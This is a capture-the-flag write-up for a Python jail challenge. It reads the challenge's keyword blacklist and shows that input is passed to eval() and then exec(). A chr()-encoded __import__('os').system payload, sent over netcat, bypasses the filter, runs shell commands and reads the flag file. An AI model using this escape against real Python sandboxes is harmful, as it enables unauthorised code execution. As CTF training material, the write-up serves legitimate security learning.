## generic pyjail
> When has a blacklist of insecure keywords EVER failed?

> nc chall2.2019.redpwn.net 6006

We are given a file `blacklist.txt`
```
$ cat blacklist.txt
import
ast
eval
=
pickle
os
subprocess
i love blacklisting words!
input
sys
windows users
print
execfile
hungrybox
builtins
open
most of these are in here just to confuse you
_
dict
[
>
<
:
;
]
exec
hah almost forgot that one
for
@
dir
yah have fun
file
```
Pyjails are always fun to break into :D

Let's first test with some random inputs.
```
$ nc chall2.2019.redpwn.net 6006
wow! there's a file called flag.txt right here!
>>> globals()
Traceback (most recent call last):
  File "jail1.py", line 52, in <module>
    exec(data)
  File "<string>", line 1
    {'no': 'file', '__builtins__': <module '__builtin__' (built-in)>, '__file__': 'jail1.py', '__package__': None, 'banned': ['import', 'ast', 'eval', '=', 'pickle', 'os', 'subprocess', 'i love blacklisting words!', 'input', 'sys', 'windows users', 'print', 'execfile', 'hungrybox', 'builtins', 'open', 'most of these are in here just to confuse you', '_', 'dict', '[', '>', '<', ':', ';', ']', 'exec', 'hah almost forgot that one', 'for', '@dir', 'yah have fun', 'file'], '__name__': '__main__', 'data': {...}, '__doc__': None, 'print_function': _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0), 65536)}
                                   ^
SyntaxError: invalid syntax

$ nc chall2.2019.redpwn.net 6006
wow! there's a file called flag.txt right here!
>>> 2
>>> a
Traceback (most recent call last):
  File "jail1.py", line 49, in <module>
    data = eval(data)
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
```
Amazing, so from error tracebacks, we can see, that first our input goes into `eval()` and then goes into `exec()`. As blacklist contains string filtering only, we can bypass this easily due to `eval()`

So, let's say our payload is `__import__('os').system('ls .')`
What we can do is make this payload as a sum of characters, that can be evaled and passed to exec, thus bypassing the blacklist.

Example, __ => chr(95)*2 => eval('chr(95)*2') = '__'

```
$ python -c "print(\"+\".join([\"chr({})\".format(ord(x)) for x in \"__import__('os').system('ls .')\"]))" |  nc chall2.2019.redpwn.net 6006  
wow! there's a file called flag.txt right here!
>>> bin
boot
dev
etc
flag.txt
home
jail1.py
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ python -c "print(\"+\".join([\"chr({})\".format(ord(x)) for x in \"__import__('os').system('cat flag.txt')\"]))" |  nc chall2.2019.redpwn.net 6006
wow! there's a file called flag.txt right here!
>>> flag{bl4ckl1sts_w0rk_gre3344T!}
```
